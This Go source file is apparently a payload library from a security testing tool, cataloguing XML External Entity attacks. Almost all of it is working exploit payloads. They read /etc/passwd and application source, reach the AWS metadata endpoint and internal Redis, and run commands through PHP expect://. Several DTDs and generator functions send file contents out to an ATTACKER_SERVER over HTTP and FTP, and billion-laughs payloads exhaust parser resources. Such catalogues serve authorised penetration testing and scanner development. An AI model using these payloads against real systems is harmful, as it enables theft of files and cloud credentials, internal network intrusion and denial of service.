// Package xxe provides XML External Entity injection payloads.
// Payloads are categorized by:
//   - Type (Classic, Blind/OOB, Error-based)
//   - Target (File read, SSRF, DoS)
//   - Parser (Generic, PHP, Java, .NET)
package xxe

import "strings"

// XXEType represents the type of XXE attack.
type XXEType string

const (
	TypeClassic    XXEType = "classic"
	TypeBlind      XXEType = "blind"
	TypeErrorBased XXEType = "error"
	TypeDoS        XXEType = "dos"
)

// TargetType represents the target of the XXE attack.
type TargetType string

const (
	TargetFileRead TargetType = "file"
	TargetSSRF     TargetType = "ssrf"
	TargetDoS      TargetType = "dos"
	TargetRCE      TargetType = "rce"
)

// Parser represents the target XML parser.
type Parser string

const (
	ParserGeneric Parser = "generic"
	ParserPHP     Parser = "php"
	ParserJava    Parser = "java"
	ParserDotNet  Parser = "dotnet"
	ParserPython  Parser = "python"
)

// Payload represents an XXE payload.
type Payload struct {
	Value       string
	Type        XXEType
	Target      TargetType
	Parser      Parser
	Description string
	WAFBypass   bool
}

// GetPayloads returns payloads for a specific XXE type.
func GetPayloads(xxeType XXEType) []Payload {
	switch xxeType {
	case TypeClassic:
		return classicPayloads
	case TypeBlind:
		return blindPayloads
	case TypeErrorBased:
		return errorPayloads
	case TypeDoS:
		return dosPayloads
	default:
		return classicPayloads
	}
}

// GetByParser returns payloads for a specific parser.
func GetByParser(parser Parser) []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.Parser == parser || p.Parser == ParserGeneric {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all XXE payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, classicPayloads...)
	all = append(all, blindPayloads...)
	all = append(all, errorPayloads...)
	all = append(all, dosPayloads...)
	return all
}

// Classic XXE payloads (in-band data exfiltration).
// Source: PayloadsAllTheThings, HackTricks
var classicPayloads = []Payload{
	// Basic file read
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "Basic file read /etc/passwd",
	},
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "Basic file read /etc/hosts",
	},
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "Windows file read win.ini",
	},

	// PHP filter for base64 encoding (handles special chars)
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserPHP,
		Description: "PHP filter base64 encode",
	},
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserPHP,
		Description: "PHP filter read source code",
	},

	// SSRF via XXE
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetSSRF,
		Parser:      ParserGeneric,
		Description: "AWS metadata SSRF",
	},
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetSSRF,
		Parser:      ParserGeneric,
		Description: "Localhost SSRF",
	},
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetSSRF,
		Parser:      ParserGeneric,
		Description: "SSH port scan via SSRF",
	},

	// Java specific
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserJava,
		Description: "Java netdoc protocol",
	},
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "jar:file:///var/www/app.jar!/META-INF/MANIFEST.MF">
]>
<foo>&xxe;</foo>`,
		Type:        TypeClassic,
		Target:      TargetFileRead,
		Parser:      ParserJava,
		Description: "Java JAR file read",
	},
}

// Blind/OOB XXE payloads.
// Source: PayloadsAllTheThings, HackTricks
var blindPayloads = []Payload{
	// External DTD based OOB
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/evil.dtd">
%xxe;
]>
<foo>test</foo>`,
		Type:        TypeBlind,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "External DTD OOB",
	},
	// The corresponding evil.dtd:
	// <!ENTITY % file SYSTEM "file:///etc/passwd">
	// <!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
	// %all;

	// Parameter entity OOB
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
%xxe;
%all;
]>
<foo>&send;</foo>`,
		Type:        TypeBlind,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "Parameter entity OOB",
	},

	// PHP expect wrapper (RCE)
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>`,
		Type:        TypeBlind,
		Target:      TargetRCE,
		Parser:      ParserPHP,
		Description: "PHP expect RCE",
	},

	// FTP OOB exfiltration
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/ftp.dtd">
%xxe;
]>`,
		Type:        TypeBlind,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "FTP OOB exfiltration",
	},
	// The corresponding ftp.dtd:
	// <!ENTITY % file SYSTEM "file:///etc/passwd">
	// <!ENTITY % all "<!ENTITY send SYSTEM 'ftp://ATTACKER_SERVER:21/%file;'>">
	// %all;

	// Gopher OOB (for SSRF chaining)
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
]>
<foo>&xxe;</foo>`,
		Type:        TypeBlind,
		Target:      TargetSSRF,
		Parser:      ParserGeneric,
		Description: "Gopher Redis SSRF",
	},
}

// Error-based XXE payloads.
// Source: PayloadsAllTheThings
var errorPayloads = []Payload{
	// Error-based exfiltration
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/error.dtd">
%dtd;
]>
<foo>test</foo>`,
		Type:        TypeErrorBased,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "Error-based exfiltration",
	},
	// The corresponding error.dtd:
	// <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'file:///nonexistent/%xxe;'>">
	// %all;
	// %send;

	// Local DTD error-based (when external DTD blocked)
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % expr 'aaa)>
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
<!ELEMENT foo (bar'>
%local_dtd;
]>
<foo>test</foo>`,
		Type:        TypeErrorBased,
		Target:      TargetFileRead,
		Parser:      ParserGeneric,
		Description: "Local DTD hijacking (fonts.dtd)",
	},
}

// DoS XXE payloads.
// Source: HackTricks
var dosPayloads = []Payload{
	// Billion laughs attack
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`,
		Type:        TypeDoS,
		Target:      TargetDoS,
		Parser:      ParserGeneric,
		Description: "Billion laughs (entity expansion)",
	},

	// Quadratic blowup
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY a "aaaaaaaaaa">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>`,
		Type:        TypeDoS,
		Target:      TargetDoS,
		Parser:      ParserGeneric,
		Description: "Quadratic blowup attack",
	},

	// External entity DoS (resource exhaustion)
	{
		Value: `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "/dev/random">
]>
<foo>&xxe;</foo>`,
		Type:        TypeDoS,
		Target:      TargetDoS,
		Parser:      ParserGeneric,
		Description: "Read /dev/random DoS",
	},
}

// sanitizeDTDValue escapes characters that could break DTD structure.
func sanitizeDTDValue(s string) string {
	r := strings.NewReplacer(
		`"`, "",
		`'`, "",
		`>`, "",
		`<`, "",
		"\n", "",
		"\r", "",
	)
	return r.Replace(s)
}

// GetDTDForBlindXXE returns a sample DTD file content for blind XXE testing.
func GetDTDForBlindXXE(attackerServer, targetFile string) string {
	attackerServer = sanitizeDTDValue(attackerServer)
	targetFile = sanitizeDTDValue(targetFile)
	return `<!ENTITY % file SYSTEM "file://` + targetFile + `">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://` + attackerServer + `/?data=%file;'>">
%all;`
}

// GetDTDForFTPExfil returns a DTD for FTP-based exfiltration.
func GetDTDForFTPExfil(attackerServer, targetFile string) string {
	attackerServer = sanitizeDTDValue(attackerServer)
	targetFile = sanitizeDTDValue(targetFile)
	return `<!ENTITY % file SYSTEM "file://` + targetFile + `">
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://` + attackerServer + `/%file;'>">
%all;`
}
